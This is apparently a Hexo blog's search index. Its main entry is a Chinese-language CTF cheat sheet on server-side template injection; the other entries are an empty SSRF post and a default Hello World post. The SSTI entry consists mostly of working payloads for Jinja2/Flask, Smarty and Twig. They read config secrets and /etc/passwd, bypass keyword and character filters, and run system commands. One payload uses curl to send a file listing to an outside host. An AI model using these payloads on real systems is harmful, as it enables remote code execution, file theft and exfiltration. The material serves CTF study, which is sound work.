<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-SSRF</title>
      <link href="/2021/07/28/ctf-ssrf/"/>
      <url>/2021/07/28/ctf-ssrf/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF SSTI</title>
      <link href="/2021/07/27/ctf-ssti/"/>
      <url>/2021/07/27/ctf-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://i.loli.net/2021/07/28/hYPU4l68D7xAg9Z.png"></p><hr><h3 id="二丶渲染模板（flask-jinja）"><a href="#二丶渲染模板（flask-jinja）" class="headerlink" title="二丶渲染模板（flask/jinja）"></a><strong>二丶渲染模板（flask/jinja）</strong></h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><table><thead><tr><th align="left"><strong>dict</strong></th><th>保存类实例或对象实例的属性变量键值对字典</th></tr></thead><tbody><tr><td align="left"><strong>class</strong></td><td>返回类型所属的对象</td></tr><tr><td align="left"><strong>mro</strong></td><td>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</td></tr><tr><td align="left">bases</td><td>返回该对象所继承的基类</td></tr><tr><td align="left"><strong>subclasses</strong></td><td>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</td></tr><tr><td align="left"><strong>init</strong></td><td>类的初始化方法</td></tr><tr><td align="left">globals</td><td>对包含函数全局变量的字典的引用</td></tr></tbody></table><h5 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a><strong>一些姿势</strong></h5><ul><li><p>[浅析SSTI(python沙盒绕过)]: </p></li><li><p><strong>config</strong></p><p><code>{{config}}</code>可以获取当前设置，如果题目类似<code>app.config ['FLAG'] = os.environ.pop（'FLAG'）</code>，那可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>得到flag</p></li><li><p><strong>self</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{self\}\} ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>[]  ()  “”</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}</code></p></li><li><p>url_for,g,request,namespace,lipsum,range,session,dict,get_flashed_message,config</p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{{url_for.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{get_flashed_messages.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}</span><br></pre></td></tr></tbody></table></figure></li></ul><h5 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a><strong>常用绕过</strong></h5><ol><li><p>以下表示法可用于访问对象的属性：</p><ul><li><code>request.__class__</code></li><li><code>request["__class__"]</code></li><li><code>request|attr("__class__")</code></li></ul></li><li><p>可以使用以下方法访问数组元素：</p><ul><li><code>array[0]</code></li><li><code>array.pop(0)</code></li><li><code>array.__getitem__(2)</code></li></ul></li><li><p>过滤[]和.</p><p>只过滤<code>[]</code>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()</code><br> 若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code>将<code>request.__class__</code>改成<code>request|attr("__class__")</code></p></li><li><p>过滤_</p><p>利用<code>request.args</code>属性</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></tbody></table></figure><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p></li><li><p>关键词过滤</p><ul><li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>​      例如被过滤掉<code>__class__</code>关键词</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br></pre></td></tr></tbody></table></figure><ul><li><p>字符串拼接绕过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br><span class="line">{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p>过滤  {   {</p><p>使用{ % if … %}1{ % endif  % }，例如</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')%}1{% endif %}</span><br></pre></td></tr></tbody></table></figure><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%}1{% endif%}</span><br></pre></td></tr></tbody></table></figure></li><li><p>引号内十六进制绕过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{"".__class__}}</span><br><span class="line">{{""["\x5f\x5fclass\x5f\x5f"]}}</span><br></pre></td></tr></tbody></table></figure><p>_<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</p></li><li><p>“ ‘ chr等被过滤，无法引入字符串</p><ul><li>直接拼接键名</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(buil=aa,tins=dd)|join()</span><br></pre></td></tr></tbody></table></figure><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(app.__doc__|list()).pop(102)|string()</span><br></pre></td></tr></tbody></table></figure><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c</span><br><span class="line">{%set i1=dict(a=i1,c=udl%(99)).values()|join %}</span><br></pre></td></tr></tbody></table></figure></li><li><p>+被过滤，无法拼接字符串</p></li></ol><ul><li><code>~</code><br> 在jinja中可以拼接字符串</li><li>格式化字符串<br> 同上</li></ul><hr><h3 id="三丶Smarty"><a href="#三丶Smarty" class="headerlink" title="三丶Smarty"></a><strong>三丶Smarty</strong></h3><p><a href="https://www.jianshu.com/p/eb8d0137a7d3">Smarty SSTI</a></p><ol><li><p>{php}{/php}</p><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p></li><li><p>{literal}</p><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p><p>那么对于php5的环境我们就可以使用</p><script language="php">phpinfo();</script></li><li><p>{if}</p><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等</p></li><li><p>getStreamVariable</p><p>新版本失效<br> <code>{self::getStreamVariable("file:///etc/passwd")}</code></p><hr><h3 id="四丶twig"><a href="#四丶twig" class="headerlink" title="四丶twig"></a><strong>四丶twig</strong></h3><p><strong>文件读取</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{{'/etc/passwd'|file_excerpt(1,30)}}</span><br><span class="line"></span><br><span class="line">{{app.request.files.get(1).__construct('/etc/passwd','')\}\}</span><br><span class="line">{{app.request.files.get(1).openFile.fread(99)\}\}</span><br></pre></td></tr></tbody></table></figure><p><strong>rce</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")}}</span><br><span class="line"></span><br><span class="line">{{['cat /etc/passwd']|filter('system')}}</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">{{app.request.query.filter(0,0,1024,{'options':'system'})}}</span><br></pre></td></tr></tbody></table></figure></li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/27/hello-world/"/>
      <url>/2021/07/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
